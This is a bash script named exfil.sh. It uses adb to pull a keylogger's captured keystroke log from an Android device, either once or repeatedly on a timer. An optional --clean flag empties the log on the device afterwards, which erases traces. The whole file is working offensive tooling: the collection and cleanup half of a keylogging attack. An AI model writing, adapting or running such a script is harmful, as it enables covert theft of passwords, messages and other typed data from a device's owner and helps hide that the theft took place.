#!/usr/bin/env bash
# =============================================================
# exfil.sh — Pull keylog from device + optional cleanup
# =============================================================
# Usage:
#   ./exfil.sh                    # pull once
#   ./exfil.sh --watch 30         # pull every 30 seconds
#   ./exfil.sh --watch 30 --clean # pull + wipe log on device
# =============================================================

set -euo pipefail

SERIAL=""
REMOTE_LOG="/data/local/tmp/kl.txt"
LOCAL_LOG="./kl_exfil.txt"
WATCH=0
INTERVAL=30
CLEAN=0

# Parse args
while [[ $# -gt 0 ]]; do
    case $1 in
        --serial)   SERIAL="$2";   shift 2 ;;
        --remote)   REMOTE_LOG="$2"; shift 2 ;;
        --local)    LOCAL_LOG="$2"; shift 2 ;;
        --watch)    WATCH=1; INTERVAL="$2"; shift 2 ;;
        --clean)    CLEAN=1; shift ;;
        *) echo "Unknown arg: $1"; exit 1 ;;
    esac
done

ADB="adb"
[[ -n "$SERIAL" ]] && ADB="adb -s $SERIAL"

log()  { echo -e "[$(date '+%H:%M:%S')] \e[32m[+]\e[0m $*"; }
warn() { echo -e "[$(date '+%H:%M:%S')] \e[33m[!]\e[0m $*"; }

pull_log() {
    if $ADB shell "[ -f $REMOTE_LOG ]" 2>/dev/null; then
        SIZE=$($ADB shell "wc -c < $REMOTE_LOG" | tr -d '\r ')
        if [[ "$SIZE" -gt 0 ]]; then
            $ADB pull "$REMOTE_LOG" "$LOCAL_LOG" 2>/dev/null
            log "Pulled ${SIZE} bytes → $LOCAL_LOG"
            if [[ "$CLEAN" -eq 1 ]]; then
                $ADB shell "> $REMOTE_LOG"
                log "Remote log cleared."
            fi
        else
            warn "Log is empty, skipping pull."
        fi
    else
        warn "Remote log not found: $REMOTE_LOG"
    fi
}

if [[ "$WATCH" -eq 1 ]]; then
    log "Watch mode: pulling every ${INTERVAL}s. Ctrl+C to stop."
    while true; do
        pull_log
        sleep "$INTERVAL"
    done
else
    pull_log
fi
